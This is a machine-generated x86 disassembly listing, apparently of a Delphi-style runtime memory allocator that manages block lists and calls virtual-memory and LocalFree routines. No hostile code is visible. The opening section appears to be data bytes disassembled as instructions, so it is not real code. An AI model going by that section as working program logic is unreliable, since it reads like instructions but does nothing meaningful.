sub_4010d4
adc [ eax ] al
add eax 0x736c6146
add al 0x54
jb r-xdata
inc eax
mov eax eax
call 0xa4050f9
push es
push ebx
je r-xdata
add al 0xf8
jmp sub_405974
je r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 2 + 0x11 ] si
inc eax
add [ edi ] al
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
add al 0x11
inc esp
and al 0x4
clc
jmp sub_40594c
insd
add [ eax ] al
cwde
adc [ eax ] eax
je r-xdata
popad
outsb
je r-xdata
insd
add al 0x0
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 2 + 0x11 ] si
inc eax
add [ eax ] al
adc [ eax ] eax
pop es
popad
jb r-xdata
inc eax
add [ ecx + edx ] dl
inc eax
add [ edx + ecx ] cl
dec edi
insb
push esi
popad
jb r-xdata
inc eax
add [ edi + eax ] cl
push esi
popad
jb r-xdata
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
popad
outsb
je r-xdata
jns r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
adc [ eax ] eax
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
sub_401215
cmc
adc [ eax ] eax
call [ ecx ]
inc eax
add [ ecx ] cl
adc al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc eax 0x8004012
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12900040 ] cl
inc eax
add [ ecx ] ah
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
adc al [ eax ]
or al 0x0
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax ] ah
pop ecx
inc eax
add [ ecx + ebx * 2 ] ch
inc eax
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + ebx * 2 ] bh
inc eax
add [ eax - 0x23ffbfcf ] ah
xor [ eax ] eax
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
sar bh 0x25
jb r-xdata
enter 0x48a1 0x0
mov eax eax
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401420
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_4013e0
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_401478
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401420
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4014c0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4014a8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4014a8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_401478
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401530
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_401478
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4014a8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4015c4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401478
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_4013f0
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_4013f8
xor eax eax
mov [ ebx ] eax
sub_401628
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_4013f0
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_4013f0
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401478
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_4013f8
xor eax eax
mov [ ebx ] eax
sub_4016a0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_4013f8
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4014a8
mov [ rw-data ] 0x1
sub_401758
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_4013f0
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_4017ec
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_4013f8
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_40186c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_4015c4
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_401758
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_4014c0
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4016a0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4014a8
jmp r-xdata
sub_4018fc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401628
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014c0
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401628
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016a0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014c0
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_401758
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016a0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4014a8
jmp r-xdata
sub_401a20
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_4017ec
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_4014c0
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4016a0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401530
jmp r-xdata
sub_401aac
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401b62
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401400
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
push 0xff8
push 0x0
call sub_4013e0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401408
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401b69
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401410
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401b70
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c46
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401408
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_4013f8
mov ebx [ ebx ]
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401418
retn
push rw-data
call sub_401410
sub_401c50
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401cb4
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401ce4
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401eb8
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d38
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401d14
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401d60
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c50
add ebx esi
mov [ rw-data ] 0x6
sub_401dd0
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c50
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401e08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401cb4
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a20
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a20
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401ce4
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401530
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d38
sub_401eb8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401e08
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f40
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401d14
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f8c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f40
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_4014c0
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401d60
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401dd0
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401ce4
sub [ edi + 0x4 ] 0x4
sub_402018
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_40186c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f8c
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_402044
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4018fc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f8c
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_402078
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_4020a4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c50
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401eb8
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_402018
test al al
jne r-xdata
mov eax esi
call sub_402078
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402198
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401aac
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402314
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401408
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_4020a4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401410
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a64
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a64
jmp r-xdata
sub_402328
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_4024ba
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401aac
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401408
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
